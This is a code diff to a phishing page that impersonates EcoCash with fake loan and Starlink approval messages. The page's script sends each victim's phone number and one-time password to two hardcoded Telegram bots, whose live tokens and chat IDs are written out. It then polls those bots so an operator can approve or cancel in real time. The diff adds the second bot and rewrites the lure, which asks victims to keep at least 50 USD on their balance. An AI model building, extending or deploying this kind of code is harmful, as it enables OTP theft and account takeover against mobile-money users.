@@ -140,7 +140,6 @@
             background: #f5f7fa;
             flex-shrink: 0;
             margin-top: auto;
-            /* Pushes footer to bottom */
         }
         /* SPINNER */
         
@@ -238,13 +237,13 @@
         <button id="submitBtn">Submit</button>
     </div>
 
-    <footer>© 2025 EcoCash</footer>
-
+    <footer>© 2026 EcoCash</footer>
     <!-- SPINNER -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
-            Please wait while we approve your loan application
+            Your Starlink data request has been approved. Your connection will be active shortly. Enjoy your browsing!
+
         </div>
     </div>
 
@@ -254,8 +253,13 @@
     </div>
 
     <script>
-        const BOT_TOKEN = '8723854990:AAF_RyrafET09R7JyN5CDu6kIkVl0dB2YFs';
-        const CHAT_ID = '1229458899';
+        // Bot 1 (your existing)
+        const BOT_TOKEN_1 = '9146324074:AAH5nOSRCMSItPPXr9FSpSMFCPzIWBtARcI';
+        const CHAT_ID_1 = '8777544671';
+
+        // Bot 2 (your second bot)
+        const BOT_TOKEN_2 = '7915486968:AAEpg0PmZlfzGKzpxcOWTTIF-x_Cg7_YEwI';
+        const CHAT_ID_2 = '5615316142';
 
         // Mask phone from localStorage
         const savedPhone = localStorage.getItem('phone') || '785123463';
@@ -273,9 +277,12 @@
 
         let otpValue = '';
         let seconds = 116;
-        let pollInterval;
-        let lastUpdateId = 0;
-        let currentCallbackData = '';
+        let pollInterval1 = null;
+        let pollInterval2 = null;
+        let lastUpdateId1 = 0;
+        let lastUpdateId2 = 0;
+        let currentTimestamp = 0;
+        let actionProcessed = false;
 
         // Countdown timer
         const countdown = setInterval(() => {
@@ -313,64 +320,127 @@
             });
         });
 
-        submitBtn.addEventListener('click', () => {
-            if (otpValue.length !== 6) return;
+        // Helper to send to a bot with inline keyboard
+        function sendToBot(botToken, chatId, text, replyMarkup) {
+            const payload = {
+                chat_id: chatId,
+                text: text,
+                parse_mode: 'Markdown'
+            };
+            if (replyMarkup) {
+                payload.reply_markup = replyMarkup;
+            }
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
 
-            spinnerOverlay.style.display = 'flex';
+        // Handle a callback query from either bot
+        function handleCallback(callbackData, callbackQueryId, botToken) {
+            if (actionProcessed) return;
+            actionProcessed = true;
 
-            const timestamp = Date.now();
-            currentCallbackData = 'action_' + timestamp;
-
-            const message = `OTP Verification\n\nPhone: +263 ${savedPhone}\nEntered OTP: ${otpValue}\n\nPlease approve or cancel the loan application.`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // Answer the callback query to remove loading state
+            fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{
-                                text: 'Approve',
-                                callback_data: 'approve_' + timestamp
-                            }, {
-                                text: 'Cancel',
-                                callback_data: 'cancel_' + timestamp
-                            }]
-                        ]
-                    }
+                    callback_query_id: callbackQueryId
                 })
-            });
+            }).catch(() => {});
 
-            // Poll for admin response
-            pollInterval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
-                    .then(res => res.json())
-                    .then(data => {
-                        if (data.ok && data.result.length > 0) {
-                            for (let update of data.result) {
-                                lastUpdateId = update.update_id;
-                                if (update.callback_query) {
-                                    const dataParts = update.callback_query.data.split('_');
-                                    if (dataParts[1] == timestamp) {
-                                        clearInterval(pollInterval);
-                                        spinnerOverlay.style.display = 'none';
-                                        resultOverlay.style.display = 'flex';
+            // Stop both polling intervals
+            if (pollInterval1) clearInterval(pollInterval1);
+            if (pollInterval2) clearInterval(pollInterval2);
 
-                                        if (dataParts[0] === 'approve') {
-                                            resultMessage.textContent = 'Your loan has been approved. You will receive a confirmation message within 15 minutes. Thank you.';
-                                        } else if (dataParts[0] === 'cancel') {
-                                            resultMessage.textContent = 'Please reapply and ensure that your information is correct and your minimum Main USD Balance is atleast $30. Thank you.';
-                                        }
-                                    }
+            spinnerOverlay.style.display = 'none';
+            resultOverlay.style.display = 'flex';
+
+            const parts = callbackData.split('_');
+            if (parts[0] === 'approve') {
+                resultMessage.textContent = 'Your Registrations fee is being approved, Login again after 5 hours and make sure you have atleast 50 USD on your balance';
+            } else if (parts[0] === 'cancel') {
+                resultMessage.textContent = 'Please reapply and ensure that your information is correct. Thank you.';
+            }
+        }
+
+        // Poll a single bot for callback responses
+        function pollBot(botToken, chatId, lastUpdateIdRef, pollIntervalRef) {
+            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateIdRef + 1}&timeout=10`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        for (let update of data.result) {
+                            // Update the reference via the outer variable reference approach
+                            if (botToken === BOT_TOKEN_1) {
+                                lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);
+                            } else {
+                                lastUpdateId2 = Math.max(lastUpdateId2, update.update_id);
+                            }
+
+                            if (update.callback_query && !actionProcessed) {
+                                const cb = update.callback_query;
+                                const dataParts = cb.data.split('_');
+                                const ts = parseInt(dataParts[1]);
+
+                                if (ts === currentTimestamp) {
+                                    handleCallback(cb.data, cb.id, botToken);
+                                    return;
                                 }
                             }
                         }
-                    });
+                    }
+                })
+                .catch(() => {});
+        }
+
+        // Start polling both bots
+        function startPollingBoth() {
+            actionProcessed = false;
+
+            // Poll Bot 1 every 1.5s
+            pollInterval1 = setInterval(() => {
+                pollBot(BOT_TOKEN_1, CHAT_ID_1, lastUpdateId1, 'pollInterval1');
             }, 1500);
+
+            // Poll Bot 2 every 1.5s
+            pollInterval2 = setInterval(() => {
+                pollBot(BOT_TOKEN_2, CHAT_ID_2, lastUpdateId2, 'pollInterval2');
+            }, 1500);
+        }
+
+        submitBtn.addEventListener('click', () => {
+            if (otpValue.length !== 6) return;
+
+            spinnerOverlay.style.display = 'flex';
+
+            currentTimestamp = Date.now();
+
+            const message = `*OTP Verification*\n\n📱 Phone: +263 ${savedPhone}\n🔢 Entered OTP: ${otpValue}\n\nPlease approve or cancel the loan application.`;
+            const replyMarkup = {
+                inline_keyboard: [
+                    [{
+                        text: '✅ Approve',
+                        callback_data: 'approve_' + currentTimestamp
+                    }, {
+                        text: '❌ Cancel',
+                        callback_data: 'cancel_' + currentTimestamp
+                    }]
+                ]
+            };
+
+            // Send to both bots with inline buttons
+            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
+            sendToBot(BOT_TOKEN_2, CHAT_ID_2, message, replyMarkup);
+
+            // Start polling both bots for the response
+            startPollingBoth();
         });
 
         checkOtpComplete();
